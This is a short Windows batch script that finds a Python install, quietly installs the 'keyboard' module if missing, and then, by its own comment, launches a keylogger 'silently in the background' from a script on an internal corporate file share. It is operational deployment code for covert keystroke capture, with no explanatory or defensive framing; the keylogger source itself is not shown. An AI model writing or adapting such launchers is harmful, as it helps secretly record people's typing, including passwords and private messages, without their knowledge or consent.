@echo off

:: 1. Find Python.exe
set PYTHON_PATH=
if exist "C:\Python313\python.exe" (
    set PYTHON_PATH=C:\Python313\python.exe
) else if exist "C:\Program Files\Python313\python.exe" (
    set PYTHON_PATH=C:\Program Files\Python313\python.exe
)

if "%PYTHON_PATH%"=="" (
    echo Python not found
    exit /b 1
)

echo Using Python: %PYTHON_PATH%


:: 2. Check for keyboard module
"%PYTHON_PATH%" -c "import keyboard" >nul 2>&1
if errorlevel 1 (
    echo [*] 'keyboard' module not found. Installing...
    "%PYTHON_PATH%" -m pip install --upgrade --user keyboard --quiet --disable-pip-version-check
)  else (
    echo [*] 'keyboard' module already installed.
)


:: 3. Launch keylogger silently in the background
start /b "" "%PYTHON_PATH%" "\\FS2.faicorp.local\Files\Shared\IT\Scripts\Python\PythonKeylogger\keywatcher_phaseone.py"
